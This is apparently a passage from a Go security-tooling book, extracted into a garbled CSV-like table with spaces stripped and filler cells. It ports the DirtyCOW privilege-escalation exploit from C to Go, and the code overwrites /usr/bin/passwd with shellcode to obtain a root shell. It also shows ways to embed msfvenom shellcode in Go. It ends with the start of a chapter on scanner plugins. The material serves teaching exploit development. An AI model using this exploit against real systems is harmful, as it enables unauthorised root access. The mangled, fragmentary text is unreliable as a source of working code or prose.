"Thevulnerability,dubbed",NA,NA
DirtyCOW,NA,NA
",pertainstoarace ",NA,NA
conditionwithintheLinuxkernel’smemorysubsystem.This ,NA,NA
"flawaffectedmost,ifnotall,commonLinuxandAndroid ",NA,NA
distributionsatthetimeofdisclosure.Thevulnerabilityhas ,NA,NA
"sincebeenpatched,soyou’llneedtotakesomespecific ",NA,NA
"measurestoreproducetheexamplesthatfollow.Specifically, ",NA,NA
you’llneedtoconfigureaLinuxsystemwithavulnerable ,NA,NA
kernelversion.Settingthisupisbeyondthescopeofthe ,NA,NA
"chapter;however,forreference,weusea64-bitUbuntu14.04 ",NA,NA
LTSdistributionwithkernelversion3.13.1.,NA,NA
Severalvariationsoftheexploitarepubliclyavailable.You,NA,NA
canfindtheoneweintendtoreplicateat,NA,NA
https://www.exploit-,NA,NA
db.com/exploits/40616/,NA,NA
.,NA,NA
Listing9-,NA,NA
5,NA,NA
showstheoriginalexploit ,NA,NA
"code,slightlymodifiedforreadability,initsentirety.","#include<stdio.h>
  
 #include<stdlib.h> 
  
 #include<sys/mman.h> 
  
 #include<fcntl.h> 
  
 #include<pthread.h> 
  
 #include<string.h> 
  
 #include<unistd.h> 
  
 void*map; 
  
 intf; 
  
 intstop=0; 
  
 structstatst; 
  
 char*name; 
  
 pthread_tpth1,pth2,pth
 3;
  
 //changeifnopermissionstoread 
  
 charsuid_binary[]=""/usr/bin/passwd
 "";
  
 unsignedcharsc[]={ 
  
 0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,
  
 --
 snip--
  
 0x68,0x00,0x56,0x57,0x48,0x89,0xe6,0x0f,0x05 
  
 }; 
  
 unsignedintsc_len=177;
  
 void*madviseThread(void*arg) 
  
 { 
  
 char*str; 
  
 str=(char*)arg; 
  
 inti,c=0; 
  
 for(i=0;i<1000000&&!stop;i++){ 
  
 c+=madvise(map,100,MADV_DONTNEED); 
  
 } 
  
 printf(""threadstopped\n"");",NA
"RatherthanexplainingthedetailsoftheCcode’slogic,",NA,NA
"let’slookatitgenerally,andthenbreakitintochunksto ",NA,NA
compareitlinebylinewiththeGoversion.,NA,NA
"Theexploitdefinessomemaliciousshellcode,in",NA,NA
"ExecutableandLinkableFormat(ELF),thatgeneratesaLinux ",NA,NA
shell.Itexecutesthecodeasaprivilegeduserbycreating ,NA,NA
multiplethreadsthatcallvarioussystemfunctionstowriteour ,NA,NA
"shellcodetomemorylocations.Eventually,theshellcode",NA,NA
exploitsthevulnerabilitybyoverwritingthecontentsofa ,NA,NA
binaryexecutablefilethathappenstohavetheSUIDbitset ,NA,NA
"andbelongstotherootuser.Inthiscase,thatbinaryis ",NA,NA
/usr/bin/passwd,NA,NA
".Normally,anonrootuserwouldn’tbeableto ",NA,NA
"overwritethefile.However,becauseoftheDirtyCOW ",NA,NA
"vulnerability,youachieveprivilegeescalationbecauseyou ",NA,NA
canwritearbitrarycontentstothefilewhilepreservingthefile ,NA,NA
permissions.,NA,NA
Nowlet’sbreaktheCcodeintoeasilydigestibleportions ,NA,NA
andcompareeachsectionwithitsequivalentinGo.Notethat ,NA,NA
theGoversionisspecificallytryingtoachievealine-by-line ,NA,NA
reproductionoftheCversion.,NA,NA
Listing9-6,NA,NA
showstheglobal ,NA,NA
"variablesdefinedorinitializedoutsideourfunctionsinC, ",NA,NA
while,NA,NA
Listing9-7,NA,NA
showstheminGo.,"❶void*map; 
 intf;
  
 ❷intstop=0; 
 structstatst;
  
 char*name;
  
 pthread_tpth1,pth2,pth3;
  
  
 //changeifnopermissionstoread
  
 ❸charsuid_binary[]=""/usr/bin/passwd
 "";
  
  
 ❹unsignedcharsc[]={ 
  
 0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,
  
 --snip--
  
 0x68,0x00,0x56,0x57,0x48,0x89,0xe6,0x0f,0x05 };
  
 unsignedintsc_len=177;
  
 Listing9-6:InitializationinC
  
 ❶varmappuintptr
  
 ❷varsignals=make(chanbool,2)",NA
ThetranslationbetweenCandGoisfairlystraightforward.,NA,NA
"Thetwocodesections,CandGo,maintainthesame",NA,NA
numberingtodemonstratehowGoachievessimilar,NA,NA
"functionalitytotherespectivelinesofCcode.Inbothcases, ",NA,NA
youtrackmappedmemorybydefininga,uintptr,NA
variable❶.In ,NA,NA
"Go,youdeclarethevariablenameas",mapp,NA
"since,unlikeC,",map,NA
isareservedkeywordinGo.Youtheninitializeavariableto ,NA,NA
beusedforsignalingthethreadstostopprocessing❷.Rather ,NA,NA
"thanuseaninteger,astheCcodedoes,theGoconventionis",NA,NA
insteadtouseabufferedbooleanchannel.Youexplicitly,NA,NA
defineitslengthtobe,2,NA
sincetherewillbetwoconcurrent,NA,NA
"functionsthatyou’llwishtosignal.Next,youdefineastring ",NA,NA
toyourSUIDexecutable❸andwrapupyourglobalvariables ,NA,NA
byhardcodingyourshellcodeintoaslice❹.Ahandfulof ,NA,NA
globalvariableswereomittedintheGocodecomparedtothe,NA,NA
"Cversion,whichmeansyou’lldefinethemasneededwithin",NA,NA
theirrespectivecodeblocks.,NA,NA
"Next,let’slookat",madvise(),NA
and,procselfmem(),NA
",thetwoprimary",NA,NA
"functionsthatexploittheracecondition.Again,we’llcompare",NA,NA
theCversionin,NA,NA
Listing9-8,NA,NA
withtheGoversionin,NA,NA
Listing9-9,NA,NA
.,"void*madviseThread(void*arg)
  
  
 {",NA
Theraceconditionfunctionsusevariationsforsignaling,NA,NA
❶.Bothfunctionscontain,for,NA
loopsthatiterateanextensive ,NA,NA
numberoftimes.TheCversionchecksthevalueofthe,stop,NA
"variable,whiletheGoversionusesa",select,NA
statementthat,NA,NA
attemptstoreadfromthe,signals,NA
channel.Whenasignalis,NA,NA
"present,thefunctionreturns.Intheeventthatnosignalis",NA,NA
"waiting,the",default,NA
caseexecutes.Theprimarydifferences,NA,NA
betweenthe,madvise(),NA
and,procselfmem(),NA
functionsoccurwithinthe,default,NA
case.Withinour,madvise(),NA
"function,youissueaLinux ",NA,NA
systemcalltothe,madvise(),NA
"❷function,whereasyour ",procselfmem(),NA
functionissuesLinuxsystemcallsto,lseek(),NA
❸and ,NA,NA
writesyourpayloadtomemory❹.,NA,NA
HerearethemaindifferencesbetweentheCandGo,NA,NA
versionsofthesefunctions:,"TheGoversionusesachanneltodeterminewhentoprematurelybreaktheloop,
  
 whiletheCfunctionusesanintegervaluetosignalwhentobreaktheloopafter
  
 thethreadraceconditionhasoccurred.
  
  
 TheGoversionusesthesyscallpackagetoissueLinuxsystemcalls.The",NA
"Now,let’sreviewthe",waitForWrite(),NA
"function,whichmonitors",NA,NA
forthepresenceofchangestoSUIDinordertoexecutethe ,NA,NA
shellcode.TheCversionisshownin,NA,NA
Listing9-10,NA,NA
",andtheGo ",NA,NA
versionisshownin,NA,NA
Listing9-11,NA,NA
.,"void*waitForWrite(void*arg){
  
 charbuf[sc_len];
  
 ❶for(;;){ 
  
 FILE*fp=fopen(suid_binary,""rb"");
  
  
 fread(buf,sc_len,1,fp);
  
 if(memcmp(buf,sc,sc_len)==0){ 
  
 printf(""%sisoverwritten\n"",suid_binary); 
  
 break; 
  
 } 
  
 fclose(fp); 
  
 sleep(1); 
  
 }
  
 ❷stop=1;
  
 printf(""Poppingrootshell.\n""); 
  
 printf(""Don'tforgettorestore/tmp/bak\n"");
  
 ❸system(suid_binary); 
  
 }
  
 Listing9-10:The
 waitForWrite()
 functioninC
  
 funcwaitForWrite(){
  
  
 buf:=make([]byte,len(sc))
  
 ❶for{",NA
"Inbothcases,thecodedefinesaninfiniteloopthat ",NA,NA
monitorstheSUIDbinaryfileforchanges❶.WhiletheC ,NA,NA
versionuses,memcmp(),NA
tocheckwhethertheshellcodehasbeen,NA,NA
"writtentothetarget,theGocodeuses",bytes.Compare(),NA
.Whenthe,NA,NA
"shellcodeispresent,you’llknowtheexploitsucceededin",NA,NA
overwritingthefile.Youthenbreakoutoftheinfiniteloop ,NA,NA
andsignaltherunningthreadsthattheycannowstop❷.As ,NA,NA
"withthecodefortheraceconditions,theGoversiondoesthis ",NA,NA
"viaachannel,whiletheCversionusesaninteger.Lastly,you ",NA,NA
executewhatisprobablythebestpartofthefunction:the ,NA,NA
SUIDtargetfilethatnowhasyourmaliciouscodewithinit❸. ,NA,NA
"TheGoversionisalittlebitmoreverbose,asyouneedtopass ",NA,NA
"inattributescorrespondingtostdin,stdout,andstderr:files ",NA,NA
"pointerstoopeninputfiles,outputfiles,anderrorfile ",NA,NA
"descriptors,respectively.",NA,NA
Nowlet’slookatour,main(),NA
"function,whichcallsthe",NA,NA
previousfunctionsnecessarytoexecutethisexploit.,NA,NA
Listing9-,NA,NA
12,NA,NA
"showstheCversion,and",NA,NA
Listing9-13,NA,NA
showstheGo ,NA,NA
version.,"intmain(intargc,char*argv[]){
  
 char*backup;
  
 printf(""DirtyCowrootprivilegeescalation\n""); 
  
 printf(""Backingup%s..to/tmp/bak\n"",suid_binary);
  
 ❶asprintf(&backup,""cp%s/tmp/bak"",suid_binary); 
 system(backup);
  
  
 ❷f=open(suid_binary,O_RDONLY); 
 fstat(f,&st);
  
  
 printf(""Sizeofbinary:%d\n"",st.st_size);
  
  
 ❸charpayload[st.st_size]; 
  
 memset(payload,0x90,st.st_size);
  
 memcpy(payload,sc,sc_len+1);
  
 ❹map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);",NA
The,main(),NA
functionstartsbybackingupthetarget ,NA,NA
"executable❶.Sinceyou’lleventuallybeoverwritingit,you ",NA,NA
don’twanttolosetheoriginalversion;doingsomayadversely ,NA,NA
affectthesystem.WhileCallowsyoutorunanoperating,NA,NA
systemcommandbycalling,system(),NA
andpassingittheentire,NA,NA
"commandasasinglestring,theGoversionreliesonthe",exec.Command(),NA
"function,whichrequiresyoutopassthe",NA,NA
"commandasseparatearguments.Next,youopentheSUID ",NA,NA
"targetfileinread-onlymode❷,retrievingthefilestats,and ",NA,NA
thenusethemtoinitializeapayloadsliceofidenticalsizeas ,NA,NA
"thetargetfile❸.InC,youfillthearraywithNOP(0x90) ",NA,NA
instructionsbycalling,memset(),NA
",andthencopyoveraportionof",NA,NA
thearraywithyourshellcodebycalling,memcpy(),NA
.Theseare,NA,NA
conveniencefunctionsthatdon’texistinGo.,NA,NA
"Instead,inGo,youloopoverthesliceelementsand",NA,NA
"manuallypopulatethemonebyteatatime.Afterdoingso, ",NA,NA
youissueaLinuxsystemcalltothe,mapp(),NA
"function❹,which ",NA,NA
mapsthecontentsofyourtargetSUIDfiletomemory.Asfor,NA,NA
"previoussystemcalls,youcanfindtheparametersneededfor ",mapp(),NA
bysearchingtheLinuxdocumentation.Youmaynotice,NA,NA
thattheGocodeissuesacallto,syscall.Syscall6(),NA
ratherthan,syscall.Syscall(),NA
.The,Syscall6(),NA
functionisusedforsystemcallsthat,NA,NA
"expectsixinputparameters,asisthecasewith",mapp(),NA
".Lastly,",NA,NA
"thecodespinsupacoupleofthreads,callingthe",madvise(),NA
and ,procselfmem(),NA
functionsconcurrently❺.Astheracecondition ,NA,NA
"ensues,youcallyour",waitForWrite(),NA
"function,whichmonitorsfor",NA,NA
"changestoyourSUIDfile,signalsthethreadstostop,and",NA,NA
executesyourmaliciouscode.,NA,NA
"Forcompleteness,",NA,NA
Listing9-14,NA,NA
showstheentiretyofthe ,NA,NA
portedGocode.,"varmappuintptr
  
 varsignals=make(chanbool,2)
  
 constSuidBinary=""/usr/bin/passwd""
  
  
 varsc=[]byte{
  
 0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,
  
 --snip-
 -
  
 0x68,0x00,0x56,0x57,0x48,0x89,0xe6,0x0f,0x05, 
  
 }
  
 funcmadvise(){ 
  
 fori:=0;i<1000000;i++{ 
  
 select{ 
  
 case<-signals: 
  
 fmt.Println(""madvisedone"") 
  
 return 
  
 default:
  
 syscall.Syscall(syscall.SYS_MADVISE,mapp,uintptr(100),",NA
"Toconfirmthatyourcodeworks,runitonyourvulnerable ",NA,NA
host.There’snothingmoresatisfyingthanseeingarootshell.,"alice@ubuntu:~$
 gorunmain.go
  
 DirtyCowrootprivilegeescalation 
  
 Backingup/usr/bin/passwd..to/tmp/b
 ak 
  
 Sizeofbinary:47032
  
 Racing,thismaytakeawhile..
  
  
 /usr/bin/passwdisoverwritten
  
 Poppingrootshell 
  
 procselfmemdon
 e
  
 Don'tforgettorestore/tmp/bak",NA
"Asyoucansee,asuccessfulrunoftheprogrambacksup ",NA,NA
the,NA,NA
/usr/bin/passwd,NA,NA
"file,racesforcontrolofthehandle, ",NA,NA
"overwritesthefilelocationwiththenewlyintendedvalues, ",NA,NA
andfinallyproducesasystemshell.TheoutputoftheLinux,id,NA
commandconfirmsthatthe,alice,NA
useraccounthasbeenelevated,NA,NA
toa,uid=0,NA
"value,indicatingroot-levelprivilege.",NA,NA
CREATINGSHELLCODEINGO,NA,NA
"Intheprevioussection,youusedrawshellcodeinvalidELF ",NA,NA
formattooverwritealegitimatefilewithyourmalicious ,NA,NA
alternative.Howmightyougeneratethatshellcodeyourself? ,NA,NA
"Asitturnsout,youcanuseyourtypicaltoolsettogenerate Go-",NA,NA
friendlyshellcode.,NA,NA
We’llshowyouhowtodothiswith,msfvenom,NA
",acommand-",NA,NA
"lineutility,buttheintegrationtechniqueswe’llteachyou ",NA,NA
aren’ttool-specific.Youcanuseseveralmethodstoworkwith ,NA,NA
"externalbinarydata,beitshellcodeorsomethingelse,and ",NA,NA
integrateitintoyourGocode.Restassuredthatthefollowing ,NA,NA
pagesdealmorewithcommondatarepresentationsthan ,NA,NA
anythingspecifictoatool.,NA,NA
"TheMetasploitFramework,apopularexploitationan",NA,NA
"d post-exploitationtoolkit,shipswith",msfvenom,NA
",atoolthat",NA,NA
generatesandtransformsanyofMetasploit’savailable ,NA,NA
payloadstoavarietyofformatsspecifiedviathe,-f,NA
argument.,NA,NA
"Unfortunately,thereisnoexplicitGotransform.However, ",NA,NA
youcanintegrateseveralformatsintoyourGocodefairly ,NA,NA
easilywithminoradjustments.We’llexplorefiveofthese,NA,NA
"formatshere:C,",hex,NA
",",num,NA
",",raw,NA
",andBase64,whilekeepingin",NA,NA
mindthatourendgoalistocreateabytesliceinGo.,NA,NA
CTransform,NA,NA
"IfyouspecifyaCtransformtype,",msfvenom,NA
willproducethe,NA,NA
payloadinaformatthatyoucandirectlyplaceintoCcode. ,NA,NA
"Thismayseemlikethelogicalfirstchoice,sincewedetailed ",NA,NA
manyofthesimilaritiesbetweenCandGoearlierinthis ,NA,NA
"chapter.However,it’snotthebestcandidateforourGocode. ",NA,NA
"Toshowyouwhy,lookatthefollowingsampleoutputinC ",NA,NA
format:,"unsignedcharbuf[]=
  
  
 ""\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30""
  
  
 ""\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff""
  
  
 --snip--
  
  
 ""\x64\x00"";",NA
We’reinterestedalmostexclusivelyinthepayload.To ,NA,NA
"makeitGo-friendly,you’llhavetoremovethesemicolonand ",NA,NA
alterthelinebreaks.Thismeansyou’lleitherneedto ,NA,NA
explicitlyappendeachlinebyaddinga,+,NA
totheendofalllines,NA,NA
"exceptthelast,orremovethelinebreaksaltogethertoproduce ",NA,NA
"onelong,continuousstring.Forsmallpayloadsthismaybe ",NA,NA
"acceptable,butforlargerpayloadsthisbecomestedioustodo ",NA,NA
manually.You’llfindyourselflikelyturningtootherLinux ,NA,NA
commandssuchas,sed,NA
and,tr,NA
tocleanitup.,NA,NA
"Onceyoucleanupthepayload,you’llhaveyourpayload ",NA,NA
"asastring.Tocreateabyteslice,you’dentersomethinglike ",NA,NA
this:,"payload:=[]byte(""\xfc\xe8\x82..."").",NA
"It’snotabadsolution,butyoucandobetter.",NA,NA
HexTransform,NA,NA
"Improvinguponthepreviousattempt,let’slookata",hex,NA
"transform.Withthisformat,",msfvenom,NA
"producesalong,",NA,NA
continuousstringofhexadecimalcharacters:,"fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ff...64
 00",NA
"Ifthisformatlooksfamiliar,it’sbecauseyouuseditwhen ",NA,NA
portingtheJavadeserializationexploit.Youpassedthisvalue ,NA,NA
asastringintoacallto,hex.DecodeString(),NA
.Itreturnsabyteslice,NA,NA
"anderrordetails,ifpresent.Youcoulduseitlikeso:","payload,err:=
  
  
 hex.DecodeString(""fce8820000006089e531c0648b50308b520c8b52148b
  
  
 72280fb74a2631ff...6400"")",NA
TranslatingthistoGoisprettysimple.Allyouhavetodo ,NA,NA
iswrapyourstringindoublequotesandpassittothefunction. ,NA,NA
"However,alargepayloadwillproduceastringthatmaynotbe ",NA,NA
"aestheticallypleasing,wrappinglinesorrunningbeyond ",NA,NA
recommendedpagemargins.Youmaystillwanttousethis ,NA,NA
"format,butwe’veprovidedathirdalternativeintheeventthat ",NA,NA
youwantyourcodetobebothfunctionalandpretty.,NA,NA
NumTransform,NA,NA
A,num,NA
transformproducesacomma-separatedlistofbytesin,NA,NA
"numerical,hexadecimalformat:","0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,
  
  
 0x50,0x30,
  
  
 0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,",NA
Youcanusethisoutputinthedirectinitializationofabyte,NA,NA
"slice,likeso:","payload:=[]byte{
  
  
 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,
  
  
 0x50,0x30,
  
  
 0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,
  
  
 0x31,0xff,
  
  
 --snip--
  
  
 0x64,0x00,
  
  
 }",NA
Becausethe,msfvenom,NA
"outputiscomma-separated,thelistof",NA,NA
bytescanwrapnicelyacrosslineswithoutclumsilyappending,NA,NA
datasets.Theonlymodificationrequiredistheadditionofa,NA,NA
singlecommaafterthelastelementinthelist.Thisoutput,NA,NA
formatiseasilyintegratedintoyourGocodeandformatted,NA,NA
pleasantly.,NA,NA
RawTransform,NA,NA
A,raw,NA
transformproducesthepayloadinrawbinaryformat.,NA,NA
"Thedataitself,ifdisplayedontheterminalwindow,likely",NA,NA
producesunprintablecharactersthatlooksomethinglikethis:,"ÐÐÐ`ÐÐ1ÐdÐP0ÐR
  
  
 Ð8ÐuÐ}Ð;}$uÐXÐX$ÐfÐYIÐ:IÐ4ÐÐ1ÐÐÐÐ",NA
Youcan’tusethisdatainyourcodeunlessyouproduceit,NA,NA
"inadifferentformat.Sowhy,youmayask,areweeven",NA,NA
"discussingrawbinarydata?Well,becauseit’sfairlycommon",NA,NA
"toencounterrawbinarydata,whetherasapayloadgenerated",NA,NA
"fromatool,thecontentsofabinaryfile,orcryptokeys. ",NA,NA
Knowinghowtorecognizebinarydataandworkitintoyour ,NA,NA
Gocodewillprovevaluable.,NA,NA
Usingthe,xxd,NA
utilityinLinuxwiththe,-i,NA
commandline,NA,NA
"switch,youcaneasilytransformyourrawbinarydataintothe ",num,NA
formatoftheprevioussection.Asample,msfvenom,NA
"commandwouldlooklikethis,whereyoupipetherawbinary ",NA,NA
outputproducedby,msfvenom,NA
intothe,xxd,NA
command:,"$msfvenom
 -p[
 payload
 ][
 options
 ]-fraw|xxd-i",NA
Youcanassigntheresultdirectlytoabytesliceas ,NA,NA
demonstratedintheprevioussection.,NA,NA
Base64Encoding,NA,NA
Although,msfvenom,NA
"doesn’tincludeapureBase64encoder,it’s",NA,NA
"fairlycommontoencounterbinarydata,includingshellcode, ",NA,NA
inBase64format.Base64encodingextendsthelengthofyour ,NA,NA
"data,butalsoallowsyoutoavoiduglyorunusablerawbinary ",NA,NA
data.Thisformatiseasiertoworkwithinyourcodethan,num,NA
",",NA,NA
"forexample,andcansimplifydatatransmissionoverprotocols ",NA,NA
"suchasHTTP.Forthatreason,it’sworthdiscussingitsusage ",NA,NA
inGo.,NA,NA
TheeasiestmethodtoproduceaBase64-encoded ,NA,NA
representationofbinarydataistousethe,base64,NA
utilityin,NA,NA
Linux.Itallowsyoutoencodeordecodedataviastdinorfrom ,NA,NA
afile.Youcoulduse,msfvenom,NA
"toproducerawbinarydata,and",NA,NA
thenencodetheresultbyusingthefollowingcommand:,"$msfvenom
 -p[
 payload
 ][
 options
 ]-fraw|base64",NA
"MuchlikeyourCoutput,theresultingpayloadcontains ",NA,NA
linebreaksthatyou’llhavetodealwithbeforeincludingitas ,NA,NA
astringinyourcode.Youcanusethe,tr,NA
utilityinLinuxto,NA,NA
"cleanuptheoutput,removingalllinebreaks:","$msfvenom
 -p[
 payload
 ][
 options
 ]-fraw|base64|tr-d""\n""",NA
"Theencodedpayloadwillnowexistasasingle,continuous ",NA,NA
"string.InyourGocode,youcanthengettherawpayloadasa ",NA,NA
byteslicebydecodingthestring.Youusethe,encoding/base64,NA
packagetogetthejobdone:,"payload,err:=
  
  
 base64.StdEncoding.DecodeString(""/OiCAAAAYInlMcBki1Awi...WFuZAA="")",NA
You’llnowhavetheabilitytoworkwiththerawbinary ,NA,NA
datawithoutalltheugliness.,NA,NA
ANoteonAssembly,NA,NA
Adiscussionofshellcodeandlow-levelprogrammingisn’t ,NA,NA
completewithoutatleastmentioningassembly.Unfortunatel,NA,NA
"y fortheshellcodecomposersandassemblyartists,Go’s ",NA,NA
"integrationwithassemblyislimited.UnlikeC,Godoesn’t ",NA,NA
supportinlineassembly.Ifyouwanttointegrateassemblyinto ,NA,NA
"yourGocode,youcandothat,sortof.You’llhaveto ",NA,NA
essentiallydefineafunctionprototypeinGowiththe ,NA,NA
assemblyinstructionsinaseparatefile.Youthenrun,gobuild,NA
to,NA,NA
"compile,link,andbuildyourfinalexecutable.Whilethismay ",NA,NA
"notseemoverlydaunting,theproblemistheassembly ",NA,NA
languageitself.Gosupportsonlyavariationofassembly ,NA,NA
basedonthePlan9operatingsystem.Thissystemwascreated ,NA,NA
byBellLabsandusedinthelate20thcentury.Theassembly,NA,NA
"syntax,includingavailableinstructionsandopcodes,isalmost ",NA,NA
nonexistent.ThismakeswritingpurePlan9assemblya ,NA,NA
"daunting,ifnotnearlyimpossible,task.",NA,NA
SUMMARY,NA,NA
"Despitelackingassemblyusability,Go’sstandardpackages ",NA,NA
offeratremendousamountoffunctionalityconduciveto ,NA,NA
vulnerabilityhuntersandexploitdevelopers.Thischapter ,NA,NA
"coveredfuzzing,portingexploits,andhandlingbinarydata ",NA,NA
"andshellcode.Asanadditionallearningexercise,we ",NA,NA
encourageyoutoexploretheexploitdatabaseat ,NA,NA
https://www.exploit-,NA,NA
db.com/,NA,NA
andtrytoportanexistingexploit ,NA,NA
toGo.Dependingonyourcomfortlevelwiththesource ,NA,NA
"language,thistaskcouldseemoverwhelmingbutitcanbean ",NA,NA
"excellentopportunitytounderstanddatamanipulation, ",NA,NA
"networkcommunications,andlow-levelsysteminteraction.",NA,NA
"Inthenextchapter,we’llstepawayfromexploitation ",NA,NA
activitiesandfocusonproducingextendabletoolsets.,NA,NA
10 ,NA,NA
GOPLUGINSANDEXTENDABLE ,NA,NA
TOOLS,NA,NA
Manysecuritytoolsareconstructedas,NA,NA
frameworks,NA,NA
—core ,NA,NA
"components,builtwithalevelofabstractionthatallowsyouto ",NA,NA
"easilyextendtheirfunctionality.Ifyouthinkaboutit,this ",NA,NA
makesalotofsenseforsecuritypractitioners.Theindustryis ,NA,NA
constantlychanging;thecommunityisalwaysinventingnew ,NA,NA
"exploitsandtechniquestoavoiddetection,creatingahighly ",NA,NA
"dynamicandsomewhatunpredictablelandscape.However,b",NA,NA
"y usingplug-insandextensions,tooldeveloperscanfuture-",NA,NA
prooftheirproductstoadegree.Byreusingtheirtools’core ,NA,NA
"componentswithoutmakingcumbersomerewrites,theycan ",NA,NA
handleindustryevolutiongracefullythroughapluggable ,NA,NA
system.,NA,NA
"This,coupledwithmassivecommunityinvolvement,is ",NA,NA
arguablyhowtheMetasploitFrameworkhasmanagedtoage ,NA,NA
"sowell.Hell,evencommercialenterpriseslikeTenableseethe ",NA,NA
valueincreatingextendableproducts;Tenablereliesona ,NA,NA
plug-in-basedsystemtoperformsignaturecheckswithinits,NA,NA
Nessusvulnerabilityscanner.,NA,NA
"Inthischapter,you’llcreatetwovulnerabilityscanner ",NA,NA
extensionsinGo.You’llfirstdothisbyusingthenativeGo plug-,NA,NA
insystemandexplicitlycompilingyourcodeasashared ,NA,NA
object.Thenyou’llrebuildthesameplug-inbyusingan ,NA,NA
"embeddedLuasystem,whichpredatesthenativeGoplug-in ",NA,NA
"system.Keepinmindthat,unlikecreatingplug-insinother ",NA,NA
"languages,suchasJavaandPython,creatingplug-insinGois ",NA,NA
afairlynewconstruct.Nativesupportforplug-inshasexisted ,NA,NA
"onlysinceGoversion1.8.Further,itwasn’tuntilGoversion ",NA,NA
1.10thatyoucouldcreatetheseplug-insasWindowsdynamic ,NA,NA
linklibraries(DLLs).Makesureyou’rerunningthelatest ,NA,NA
versionofGosothatalltheexamplesinthischapterworkas ,NA,NA
planned.,NA,NA
USINGGO’SNATIVEPLUG-IN ,NA,NA
SYSTEM,NA,NA
"Priortoversion1.8ofGo,thelanguagedidn’tsupportplug-",NA,NA
insordynamicruntimecodeextendibility.Whereaslanguages ,NA,NA
likeJavaallowyoutoloadaclassorJARfilewhenyou ,NA,NA
executeyourprogramtoinstantiatetheimportedtypesandcal,NA,NA
"l theirfunctions,Goprovidednosuchluxury.Althoughyou ",NA,NA
couldsometimesextendfunctionalitythroughinterface ,NA,NA
"implementationsandsuch,youcouldn’ttrulydynamically ",NA,NA
"loadandexecutethecodeitself.Instead,youneededto ",NA,NA
"properlyincludeitduringcompiletime.Asanexample,there ",NA,NA
"wasnowaytoreplicatetheJavafunctionalityshownhere, ",NA,NA
"whichdynamicallyloadsaclassfromafile,instantiatesthe ",NA,NA
"class,andcalls",someMethod(),NA
ontheinstance:,HivaNetwork.Com,NA
"Luckily,thelaterversionsofGohavetheabilitytomimic ",NA,NA
"thisfunctionality,allowingdeveloperstocompilecode ",NA,NA
"explicitlyforuseasaplug-in.Limitationsexist,though. ",NA,NA
"Specifically,priortoversion1.10,theplug-insystemworked ",NA,NA
"onlyonLinux,soyou’dhavetodeployyourextendable ",NA,NA
frameworkonLinux.,NA,NA
Go’splug-insarecreatedassharedobjectsduringthe ,NA,NA
"buildingprocess.Toproducethissharedobject,youenterthe ",NA,NA
"followingbuildcommand,whichsupplies",plugin,NA
asthe,buildmode,NA
option:,"$
 gobuild-buildmode=plugin",NA
"Alternatively,tobuildaWindowsDLL,use",c-shared,NA
asthe,buildmode,NA
option:,"$
 gobuild-buildmode=c-shared",NA
"TobuildaWindowsDLL,yourprogrammustmeetcertain ",NA,NA
conventionstoexportyourfunctionsandalsomustimportthe ,C,NA
library.We’llletyouexplorethesedetailsonyourown.,NA,NA
"Throughoutthischapter,we’llfocusalmostexclusivelyonthe ",NA,NA
"Linuxplug-invariant,sincewe’lldemonstratehowtoloadand ",NA,NA
useDLLsin,NA,NA
Chapter12,NA,NA
.,NA,NA
"Afteryou’vecompiledtoaDLLorsharedobject,a ",NA,NA
separateprogramcanloadandusetheplug-inatruntime.Any ,NA,NA
oftheexportedfunctionswillbeaccessible.Tointeractwith,NA,NA
"theexportedfeaturesofasharedobject,you’lluseGo’s",plugin,NA
package.Thefunctionalityinthepackageisstraightforward. ,NA,NA
"Touseaplug-in,followthesesteps:","1.
  Callplugin.Open(
 filenamestring
 )toopenasharedobjectfile,creatinga 
  
 *plugin.Plugininstance.
  
 2.
  Onthe*plugin.Plugininstance,callLookup(
 symbolNamestring
 )toretrievea 
  
 Symbol(thatis,anexportedvariableorfunction)byname.
  
 3.
  UseatypeassertiontoconvertthegenericSymboltothetypeexpectedbyyour 
  
 program.
  
 4.
  Usetheresultingconvertedobjectasdesired.",NA
Youmayhavenoticedthatthecallto,Lookup(),NA
requiresthe,NA,NA
consumertosupplyasymbolname.Thismeansthatthe ,NA,NA
"consumermusthaveapredefined,andhopefullypublicized, ",NA,NA
namingscheme.ThinkofitasalmostadefinedAPIorgeneric ,NA,NA
interfacetowhichplug-inswillbeexpectedtoadhere.,NA,NA
"Withoutastandardnamingscheme,newplug-inswould ",NA,NA
"requireyoutomakechangestotheconsumercode,defeating ",NA,NA
theentirepurposeofaplug-in-basedsystem.,NA,NA
"Intheexamplesthatfollow,youshouldexpectplug-insto ",NA,NA
defineanexportedfunctionnamed,New(),NA
thatreturnsaspecific,NA,NA
"interfacetype.Thatway,you’llbeabletostandardizethe ",NA,NA
bootstrappingprocess.Gettingahandlebacktoaninterface ,NA,NA
allowsustocallfunctionsontheobjectinapredictableway.,NA,NA
Nowlet’sstartcreatingyourpluggablevulnerability ,NA,NA
scanner.Eachplug-inwillimplementitsownsignature-,NA,NA
checkinglogic.Yourmainscannercodewillbootstrapthe ,NA,NA
processbyreadingyourplug-insfromasingledirectoryon ,NA,NA
"yourfilesystem.Tomakethisallwork,you’llhavetwo ",NA,NA
separaterepositories:oneforyourplug-insandoneforthe ,NA,NA
mainprogramthatconsumestheplug-ins.,NA,NA
CreatingtheMainProgram,NA,NA
CreatingtheMainProgram,NA,NA
"Let’sstartwithyourmainprogram,towhichyou’llattach ",NA,NA
yourplug-ins.Thiswillhelpyouunderstandtheprocessof ,NA,NA
authoringyourplug-ins.Setupyourrepository’sdirectory ,NA,NA
structuresoitmatchestheoneshownhere:,"$
 tree
  
  
 .
  
  
 ---cmd
  
  
 ---scanner
  
  
 ---main.go
  
  
 ---plugins
  
  
 ---scanner
  
  
 ---scanner.go",NA
